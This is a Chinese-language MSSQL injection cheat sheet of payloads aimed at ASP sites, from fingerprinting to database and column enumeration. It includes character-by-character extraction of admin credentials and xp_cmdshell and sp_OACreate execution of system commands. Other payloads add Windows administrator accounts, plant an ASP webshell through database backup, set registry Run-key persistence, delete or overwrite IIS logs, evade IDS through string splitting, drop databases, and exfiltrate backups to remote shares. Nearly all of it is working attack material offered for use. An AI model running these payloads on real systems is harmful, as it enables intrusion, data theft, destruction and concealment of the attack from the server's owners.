# MSSQL注入
## 手工MSSQL注入常用SQL语句
and exists (select * from sysobjects) //判断是否是MSSQL
and exists(select * from tableName) //判断某表是否存在..tableName为表名
and 1=(select @@VERSION) //MSSQL版本
and 1=(select db_name()) //当前数据库名
and 1=(select @@servername) //本地服务名
and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员
and 1=(Select IS_MEMBER('db_owner')) //判断是否是库权限
and 1= (Select HAS_DBACCESS('master')) //判断是否有库读取权限
and 1=(select name from master.dbo.sysdatabases where dbid=1) //暴库名DBID为1，2，3....
;declare @d int //是否支持多行
and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') //判断XP_CMDSHELL是否存在
and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread') //查看XP_regread扩展存储过程是不是已经被删除
添加和删除一个SA权限的用户test：（需要SA权限）
exec master.dbo.sp_addlogin test,password
exec master.dbo.sp_addsrvrolemember test,sysadmin
停掉或激活某个服务。 （需要SA权限）
exec master..xp_servicecontrol 'stop','schedule'
exec master..xp_servicecontrol 'start','schedule'
暴网站目录
create table labeng(lala nvarchar(255), id int)
DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result);
and 1=(select top 1 lala from labeng) 或者and 1=(select count(*) from labeng where lala>1)

## mssql 注入语句集合
### 返回的是连接的数据库名
and db_name()>0
### 作用是获取连接用户名
and user>0
### 将数据库备份到Web目录下面
;backup database 数据库名 to disk='c:\inetpub\wwwroot\1.db';--
### 显示SQL系统版本
and 1=(select @@VERSION) 或and 1=convert(int,@@version)--
### 判断xp_cmdshell扩展存储过程是否存在
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell')
### 恢复xp_cmdshell扩展存储的命令
;exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';--
### 向启动组中写入命令行和执行程序
;EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\
Run','help1','REG_SZ','cmd.exe /c net user test ptlove /add'
### 查看当前的数据库名称
and 0 <> db_name(n) n改成0,1,2,3……就可以跨库了 或and 1=convert(int,db_name())--
### 不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令（同第76）
### 则把得到的数据内容全部备份到WEB目录下
;backup database 数据库名 to disk='c:\inetpub\wwwroot\save.db'
### 通过复制CMD创建UNICODE漏洞
;exec master.dbo.xp_cmdshell "copy c:\winnt\system32\cmd.exe   c:\inetpub\scripts\cmd.exe"
### 遍历系统的目录结构，分析结果并发现WEB虚拟目录
先创建一个临时表：temp ;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
(1)利用xp_availablemedia来获得当前所有驱动器,并存入temp表中    ;insert temp exec master.dbo.xp_availablemedia;--
通过查询temp的内容来获得驱动器列表及相关信息
(2)利用xp_subdirs获得子目录列表,并存入temp表中                    ;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
(3)还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中   ;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- （实验成功）
### 查看某个文件的内容，可以通过执行xp_cmdsell
;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--
### 将一个文本文件插入到一个临时表中
;bulk insert temp(id) from 'c:\inetpub\wwwroot\index.asp'
### 每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：
;delete from temp;--
### 浏览TEMP表的方法是：
and (select top 1 id from TestDB.dbo.temp)>0 假设TestDB是当前连接的数据库名
### 猜解所有数据库名称
and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0   dbid=6,7,8分别得到其它库名
### 猜解数据库中用户名表的名称
and (select count(*) from TestDB.dbo.表名)>0 若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。
### 判断是否是sysadmin权限
and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))
### 判断是否是SA用户
'sa'=(SELECT System_user)
### 查看数据库角色
;use model--
### 查看库名
and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)--
### 获得第一个用户建立表的名称
and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 )>0   假设要获得数据库是TestDB.dbo
### 获得第二个用户建立的表的名称
and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'))>0
### 获得第三个用户建立的表的名称
and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz',''))>0   ''中为第二个用户名
### 获得第四个用户建立的表的名称
and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz','',''))>0   '',''中为第二,三个用户名
### 获得表中记录的条数
and (select count(*) from 表名）<5 记录条数小于5   或   <10 记录条数小于10   ……等等
### 测试权限结构（mssql）
and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'));--
and 1=(SELECT IS_SRVROLEMEMBER('serveradmin'));--
and 1=(SELECT IS_SRVROLEMEMBER('setupadmin'));--
and 1=(SELECT IS_SRVROLEMEMBER('securityadmin'));--
and 1=(SELECT IS_SRVROLEMEMBER('diskadmin'));--
and 1=(SELECT IS_SRVROLEMEMBER('bulkadmin'));--
and 1=(SELECT IS_MEMBER('db_owner'));--
###  添加mssql和系统的帐户
;exec master.dbo.sp_addlogin username;--
;exec master.dbo.sp_password null,username,password;--
;exec master.dbo.sp_addsrvrolemember sysadmin username;--
;exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--
;exec master.dbo.xp_cmdshell 'net user username password /add';--
;exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';--
###  简洁的webshell
use model
create table cmd(str );
insert into cmd(str) values ('<%=server.createobject("wscript.shell").exec("cmd.exe /c "&request("c")).stdout.readall%>');
backup database model to disk='g:\wwwtest\l.asp';

请求的时候，像这样子用：
http://ip/l.asp?c=dir
### 猜解字段名称
猜解法：and (select count(字段名) from 表名)>0   若“字段名”存在，则返回正常
读取法：and (select top 1 col_name(object_id('表名'),1) from sysobjects)>0   把col_name(object_id('表名'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。
###  猜解用户名与密码
ASCII码逐字解码法:基本的思路是先猜出字段的长度，然后依次猜出每一位的值
and (select top 1 len(username) from admin)=X(X=1,2，3,4，5，… n，假设：username为用户名字段的名称，admin为表的名称   若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。
and (select top 1 ascii(substring(username,m,1)) from admin)=n   (m的值在上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~### a~z### A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，
### 建立数据表
;create table 表名 (列名1 数据类型,列名2 数据类型);--
### 向表格中插入数据
;insert into 表名 (列名1,列名2，……） values ('值1','值2'……);--
### 更新记录
update 表名 set 列名1='值'…… where ……
### 删除记录
delete from 表名 where ……
### 删除数据库表格
drop table 表名
### 将文本文件导入表
使用'bulk insert'语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：
create table foo( line varchar(8000))
然后执行bulk insert操作把文件中的数据插入到表中，如：
bulk insert foo from 'c:\inetpub\wwwroot\process_login.asp'
### 备份当前数据库的命令：
declare @a sysname;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' ,name='test';--
### 使用sp_makewebtask处理过程的相关请求写入URL
; EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"
### 将获得SQLSERVER进程的当前工作目录中的目录列表
Exec master..xp_cmdshell 'dir'
### 将提供服务器上所有用户的列表
Exec master..xp_cmdshell 'net user'
### 读注册表存储过程
exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
### xp_servicecontrol过程允许用户启动，停止，暂停和继续服务
exec master..xp_servicecontrol 'start','schedule'
exec master..xp_servicecontrol 'start','server'
### 显示机器上有用的驱动器
Xp_availablemedia
### 允许获得一个目录树
Xp_dirtree
### 提供进程的进程ID，终止此进程
Xp_terminate_process
### 恢复xp_cmdshell
Exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll'
### 堵上cmdshell的SQL语句
sp_dropextendedproc "xp_cmdshell"
### 不需要XP_CMDSHLL直接添加系统帐号,对XPLOG70.DLL被删很有效
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user gchn aaa /add'--
### 在数据库内添加一个hax用户
;exec sp_addlogin hax;--
### 给hax设置密码
;exec master.dbo.sp_password null,username,password;--
### 将hax添加到sysadmin组
;exec master.dbo.sp_addsrvrolemember sysadmin hax;--
### (1)遍历目录
;create table dirs(paths varchar(100), id int)
;insert dirs exec master.dbo.xp_dirtree 'c:\'
;and (select top 1 paths from dirs)>0
;and (select top 1 paths from dirs where paths not in('上步得到的paths'))>)
### (2)遍历目录
;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
;insert temp exec master.dbo.xp_availablemedia;-- 获得当前所有驱动器
;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';-- 获得子目录列表
;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- 获得所有子目录的目录树结构
;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';-- 查看文件的内容
### mssql中的存储过程
xp_regenumvalues 注册表根键, 子键
;exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 以多个记录集方式返回所有键值
xp_regread 根键,子键,键值名
;exec xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','CommonFilesDir' 返回制定键的值
xp_regwrite 根键,子键, 值名, 值类型, 值
值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型
;exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName','reg_sz','hello' 写入注册表
xp_regdeletevalue 根键,子键,值名
exec xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName' 删除某个值
xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Tes
## SQL Server注入实例

判断是否可注射：
http://www.targer.com/article.asp?id=6
http://www.targer.com/article.asp?id=6'
http://www.targer.com/article.asp?id=6 and 1=1
http://www.targer.com/article.asp?id=6 and 1=2
http://www.targer.com/article.asp?action=value' and 1=1
http://www.targer.com/article.asp?action=value' and 1=2
searchpoints%' and 1=1
searchpoints%' and 1=2

确定数据库类型：
http://www.targer.com/article.asp?id=6 and user>0
http://www.targer.com/article.asp?id=6 and (select count(*) from sysobjects)>0

查询当前用户数据信息：
article.asp?id=6 having 1=1--

暴当前表中的列：
article.asp?id=6 group by admin.username having 1=1--
article.asp?id=6 group by admin.username,admin.password having 1=1--

暴任意表和列：
and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)>1
and (select top col_name(object_id('admin'),N) from sysobjects)>1

暴数据库数据：
and (select top 1 password from admin where id=N)>1

修改数据库中的数据：
;update admin set password='oooooo' where username='xxx'

增添数据库中的数据：
;insert into admin values (xxx,oooooo)--

删数据库：
;drop database webdata

获取信息：
获取当前数据库用户名：and user>0
获取当前数据库名：and db_name()>0
获取数据库版本：and (select @@version)>0
判断是否支持多句查询：;declare @a int--
判断是否支持子查询：and (select count(1) from [sysobjects])>=0
数据库的扩展存储过程：exec master..xp_cmdshell
查看服务器C盘目录：;exec_master..xp_cmdshell 'dir c:\'
判断扩展存储过程是否存在：and select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
恢复扩展存储过程：;exec sp_addextendedproc xp_cmdshell,'xplog70.dll'
删除扩展存储过程：;exec sp_dropextendedproc 'xp_cmdshell'

在MSSQL2000中提供了一些函数用于访问OLE对象间接获取权限：
;declare @s int
;exec sp_oacreat 'wscript.shell',@s
;exec master..spoamethod @s,'run',null,'cmd.exe/c dir c:\'

判断当前数据库用户名是否拥有比较高的权限：
and 1=(select is_srvrolemember('sysadmin'))
and 1=(select is_srvrolemember('serveradmin'))
and 1=(select is_srvrolemember('setupadmin'))
and 1=(select is_srvrolemember('securityadmin'))
and 1=(select is_srvrolemember('diskadmin'))
and 1=(select is_srvrolemember('bulkadmin'))

判断当前数据库用户名是否为DB_OWNER：
and 1=(select is_member('db_owner'))

在SQLSERVER的master.dbo.sysdatabases表中存放着SQLSERVER数据库系统中的所有数据库信息，只需要PUBLIC权限就可以对此表进行SELECT操作：
and (select top 1 name from master.dbo.sysdatabase order by dbid)>0
and (select top 1 name from master.dbo.sysdatabase where name not in(select top 1 name from master.dbo.sysdatabases order by dbid) order by dbid)>0

删除日志记录：
;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5\ex070606.log >c:\temp.txt'

替换日志记录：
;exec master.dbo.xp_cmdshell 'copy c:\winnt\system32\logfiles\w3svc5\ex070404.log c:\winnt\system32\logfiles\w3svc5\ex070606.log >c:\temp.txt'

获取WEB路径：
;declare @shell int
;exec master..sp_oamethod 'wscript.shell',@shell out
;exec master..sp_oamethod @shell,'run',null,'cmd.exe/c dir /s d:/index.asp >c:/log.txt

利用XP_CMDSHELL搜索：
;exec master..xp_cmdshell 'dir /s d:/index.asp'

显示服务器网站配置信息命令：
cmd /c cscript.exe c:\inetpub\adminscript\adsutil.vbs enum w3svc/1/root
cmd /c cscript.exe c:\inetpub\adminscript\adsutil.vbs enum w3svc/2/root

利用XP_REGREAD可用PUBLIC权限读取：
;exec master.dbo.xp_regread
hkey_local_machine,
'system\currentcontrolset\services\w3svc\parameters\virtual roots\'
'/'

SQLSERVER下的高级技术可以参考阅读曾云好所著的精通脚本黑客第五章。

### DSqlHelper

检测权限SYSADMIN：
and 1=(select IS_SRVROLEMEMBER('sysadmin'))
serveradmin### setupadmin### securityadmin### diskadmin### bulkadmin### db_owner。

检测XP_CMDSHELL（CMD命令）：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_cmdshell')
检测XP_REGREAD（注册表读取功能）：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_regread')
检测SP_MAKEWEBTASK（备份功能）：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_makewebtask')
检测SP_ADDEXTENDEDPROC：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_addextendedproc')
检测XP_SUBDIRS读子目录：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_subdirs')
检测XP_DIRTREE读子目录：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree')

修改内容：
; UPDATE 表名 set 字段=内容 where 1=1

XP_CMDSHELL检测：
;exec master..xp_cmdshell 'dir c:\'
修复XP_CMDSHELL：
;exec master.dbo.sp_addextendedproc 'xp_cmdshell', 'xplog70.dll'
用XP_CMDSHELL添加用户hacker：
;exec master.dbo.xp_cmdshell 'net user hacker 123456 /add'
XP_CMDSHELL把用户hacker加到ADMIN组：
;exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'

创建表test：
;create table [dbo].[test] ([dstr][char](255));
检测表段test：
and exists (select * from test)
读取WEB的位置（读注册表）：
;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots', '/',@result output insert into test (dstr) values(@result);--
爆出WEB的绝对路径（显错模式）：
and 1=(select count(*) from test where dstr > 1)
删除表test：
;drop table test;--

创建查看目录的表dirs：
;create table dirs(paths varchar(100), id int)
把查看目录的内容加入表dirs：
;insert dirs exec master.dbo.xp_dirtree 'c:\'
爆目录的内容dirs：
and 0<>(select top 1 paths from dirs)
备份数据库DATANAME：
declare @a sysname; set @a=db_name();backup DATANAME @a to disk='c:\inetpub\wwwroot\down.bak';--
删除表dirs：
;drop table dirs;--

创建表temp：
;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
把驱动盘列表加入temp表：
;insert temp exec master.dbo.xp_availablemedia;--
删除表temp：
;delete from temp;--

创建表dirs：
;create table dirs(paths varchar(100), id int);--
获得子目录列表XP_SUBDIRS：
;insert dirs exec master.dbo.xp_subdirs 'c:\';--
爆出内容（显错模式）：
and 0<>(select top 1 paths from dirs)
删除表dirs：
;delete from dirs;--

创建表dirs：
;create table dirs(paths varchar(100), id int)--
用XP_CMDSHELL查看目录内容：
;insert dirs exec master..xp_cmdshell 'dir c:\'
删除表dirs：
;delete from dirs;--

检测SP_OAcreate（执行命令）：
and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'SP_OAcreate')
SP_OAcreate执行CMD命令：
;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c net user hacker 123456 /add'
SP_OAcreate建目录：
;DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:\WINNT\system32\cmd.exe /c md c:\inetpub\wwwroot\1111'
创建一个虚拟目录E盘：
;declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\mkwebdir.vbs -w "默认 Web 站点" -v "e","e:\"'
设置虚拟目录E为可读：
;declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL,' cscript.exe c:\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse'
启动SERVER服务：
;exec master..xp_servicecontrol 'start', 'server'
绕过IDS检测XP_CMDSHELL：
;declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\'
开启远程数据库1：
; select * from OPENROWSET('SQLOLEDB', 'server=servername;uid=sa;pwd=apachy_123', 'select * from table1' )
开启远程数据库2：
;select * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table'
